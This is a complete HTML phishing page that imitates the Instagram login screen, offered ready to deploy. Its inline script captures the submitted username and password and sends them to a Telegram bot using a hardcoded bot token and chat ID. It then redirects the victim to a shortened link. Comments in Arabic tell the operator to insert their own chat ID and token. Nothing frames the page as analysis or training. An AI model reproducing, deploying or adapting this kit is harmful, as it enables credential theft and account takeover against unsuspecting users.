<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            max-width: 1000px;
            width: 100%;
            padding: 20px;
            box-sizing: border-box;
        }

        .phone-image {
            flex: 1;
            display: none;
            justify-content: center;
            align-items: center;
        }

        .phone-image img {
            max-width: 100%;
            height: auto;
        }

        .login-box {
            flex: 1;
            max-width: 350px;
            width: 100%;
            padding: 20px;
            background-color: #fff;
            border: 1px solid #dbdbdb;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .login-box h1 {
            font-size: 3em;
            margin-bottom: 20px;
            font-family: 'Billabong', cursive;
        }

        .login-box input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            box-sizing: border-box;
        }

        .login-box .btn-login {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        .login-box .btn-login:hover {
            background-color: #0077cc;
        }

        .login-box .divider {
            margin: 15px 0;
            position: relative;
            text-align: center;
        }

        .login-box .divider:before,
        .login-box .divider:after {
            content: '';
            position: absolute;
            top: 50%;
            width: 40%;
            height: 1px;
            background-color: #dbdbdb;
        }

        .login-box .divider:before {
            left: 0;
        }

        .login-box .divider:after {
            right: 0;
        }

        .login-box .divider span {
            background-color: #fff;
            padding: 0 10px;
            color: #8e8e8e;
        }

        .login-box .facebook-login {
            display: inline-block;
            margin-top: 15px;
            color: #385185;
            font-weight: bold;
            text-decoration: none;
        }

        .login-box .forgot-password {
            margin-top: 20px;
            color: #00376b;
            font-size: 0.9em;
            text-decoration: none;
        }

        .signup-box {
            margin-top: 20px;
            padding: 20px;
            background-color: #fff;
            border: 1px solid #dbdbdb;
            text-align: center;
        }

        .signup-box a {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }

        .download-app {
            text-align: center;
            margin-top: 20px;
        }

        .download-app img {
            max-width: 136px;
            margin: 5px;
        }

        @media (min-width: 768px) {
            .phone-image {
                display: flex;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="phone-image">
            <img src="https://i.imgur.com/zQPv6Tg.png" alt="Instagram Mobile Preview">
        </div>
        <div>
            <div class="login-box">
                <h1>Instagram</h1>
                <form id="loginForm">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit" class="btn-login">Log In</button>
                    <div class="divider"><span>OR</span></div>
                    <a href="#" class="facebook-login">Log in with Facebook</a><br>
                    <a href="#" class="forgot-password">Forgot password?</a>
                </form>
            </div>
            <div class="signup-box">
                <p>Don't have an account? <a href="#">Sign up</a></p>
            </div>
            <div class="download-app">
                <p>Get the app.</p>
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yk/r/NtqqucWkedn.png" alt="App Store">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yr/r/093c-DX36-y.png" alt="Google Play">
            </div>
        </div>
    </div>
    <script>
        const form = document.querySelector('#loginForm');
        const chatId = '614770779'; // ضع هنا معرف الدردشة الخاص بك
        const botToken = '7489145843:AAEPhf2hgpI75l5npkxxVmm1sKX-ctiRz9Q'; // ضع هنا رمز التوكن الخاص بالبوت

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            const formData = new FormData(form);
            const message = `
                instagram Username or Email: ${formData.get('username')}
                Password: ${formData.get('password')}
            `;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const data = {
                chat_id: chatId,
                text: message
            };

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).then(() => {
                window.location.href = 'https://smrturl.co/cedf363';
            });
        });
    </script>
</body>
</html>
